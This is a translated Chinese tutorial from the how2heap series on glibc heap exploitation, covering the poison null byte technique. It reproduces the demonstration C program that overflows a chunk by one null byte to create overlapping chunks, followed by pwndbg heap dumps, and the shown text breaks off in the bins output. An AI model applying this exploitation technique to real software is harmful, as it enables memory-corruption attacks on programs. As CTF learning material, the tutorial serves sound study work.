# how2heap之poison_null_bytes&&house of einherjar
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 欢迎各位喜欢安全的小伙伴们加入星盟安全 UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
>
> 本文包括poison null bytes和house of einherjar
PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 🙂
## 参考网站
    https://ctf-wiki.github.io/ctf-wiki
    https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606
## poison null bytes
###  序
作者的话:本例推荐在ubuntu14.04上进行测试,并且只适用于没有tcache的glibc
这个poison null byte利用思路依旧是制造一个overlapping
chunk,虽然作者说要在ubuntu14.04上测试,但其实ubuntu16.04也是可以的,只要没有tcache,这种攻击方式就是可以使用的:)
###  源代码
这里我也删了一部分作者的话,加了些注释
    #include                                                                                                                               
    #include                                                                                                                                       
    #include                                                                                                                                       
    #include                                                                                                                                       
    #include                                                                                                                                       
    int main()                                                                                                                                               
    {                                                                                                                                                                                  
            uint8_t* a;                                                                                                                                      
            uint8_t* b;                                                                                                                                      
            uint8_t* c;                                                                                                                                      
            uint8_t* b1;                                                                                                                                     
            uint8_t* b2;                                                                                                                                     
            uint8_t* d;                                                                                                                                      
            void *barrier;                                                                                                                                   
            fprintf(stderr, "We allocate 0x100 bytes for 'a'.n");                                                                                           
            a = (uint8_t*) malloc(0x100);                                                                                                                    
            fprintf(stderr, "a: %pn", a);                                                                                                                   
            int real_a_size = malloc_usable_size(a);             
            //我们想溢出'a'的话,我们需要知道'a'的真实大小
            fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' "                                                         
                    "(it may be more than 0x100 because of rounding): %#xn", real_a_size);                                                                  
            //chunk size属性的最小的有效字节不能是0x00,最小的也必须是0x10,因为chunk的size包括请求的量加上元数据所需的大小(也就是我们的size和pre_size然后空间复用
            /* chunk size attribute cannot have a least significant byte with a value of 0x00.                                                               
             * the least significant byte of this will be 0x10, because the size of the chunk includes                                                       
             * the amount requested plus some amount required for the metadata. */                                                                           
            b = (uint8_t*) malloc(0x200);                                                                                                                    
            fprintf(stderr, "b: %pn", b);                                                                                                                   
            c = (uint8_t*) malloc(0x100);                                                                                                                    
            fprintf(stderr, "c: %pn", c);                                                                                                                   
            barrier =  malloc(0x100);              
            //c我们分配了barrier,这样我们free c的时候就不会被合并到top chunk里了,这个burrier并不是必须的,只不过是为了减少可能产生的问题                                                                                                     
            fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.n"                                    
                    "The barrier is not strictly necessary, but makes things less confusingn", barrier);                                                    
            uint64_t* b_size_ptr = (uint64_t*)(b - 8);                                                                                                       
            //在新版本的glibc中添加了新的check即: size==prev_next(next_chunk)
            // added fix for size==prev_size(next_chunk) check in newer versions of glibc                                                                    
            // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30        
            //这个被新增的check要求我们允许b中有null指针而不仅仅是c                                       
            // this added check requires we are allowed to have null pointers in b (not just a c string)                                                     
            //*(size_t*)(b+0x1f0) = 0x200;   
            //在新版本的glibc中我们需要让我们更新的size包含b自身去pass 'chunksize(P)!=prev_size(next_chunk(P))'                                                                                                                
            fprintf(stderr, "In newer versions of glibc we will need to have our updated size inside b itself to pass "                                      
                    "the check 'chunksize(P) != prev_size (next_chunk(P))'n");           
            //我们将此位置设为0x200,因为0x200==(0x211&0xff00)
            // we set this location to 0x200 since 0x200 == (0x211 & 0xff00)   
            //这个是b.size的值在被null字节覆盖之后的值                                                                              
            // which is the value of b.size after its first byte has been overwritten with a NULL byte                                                       
            *(size_t*)(b+0x1f0) = 0x200;                                                                                                                     
            //这个技术通过覆盖一个free chunk的元数据来生效
            // this technique works by overwriting the size metadata of a free chunk                                                                         
            free(b);                                                                                                                                         
            fprintf(stderr, "b.size: %#lxn", *b_size_ptr);                                                                                                  
            fprintf(stderr, "b.size is: (0x200 + 0x10) | prev_in_usen"); 
            //我们通过用一个null字节来溢出a来修改b的元数据                                                                                   
            fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'n");                                                           
            a[real_a_size] = 0; //  heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 PREV_INUSE {
      prev_size = 0,
      size = 529,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603320 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603430 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603540 PREV_INUSE {
      prev_size = 0,
      size = 133825,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
然后程序修改了b+0x1f0位为0x200,也就是
    pwndbg> p/x 0x603120+0x1f0
    $4 = 0x603310
    pwndbg> x/10gx 0x603310
    0x603310:       0x0000000000000200      0x0000000000000000
    0x603320:       0x0000000000000000      0x0000000000000111
    0x603330:       0x0000000000000000      0x0000000000000000
    0x603340:       0x0000000000000000      0x0000000000000000
    0x603350:       0x0000000000000000      0x0000000000000000
好了,下面我们继续,此时程序已经释放了b
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 PREV_INUSE {
      prev_size = 0,
      size = 529,
      fd = 0x7ffff7dd1b78 ,
      bk = 0x7ffff7dd1b78 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603320 {
      prev_size = 528,
      size = 272,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603430 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603540 PREV_INUSE {
      prev_size = 0,
      size = 133825,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0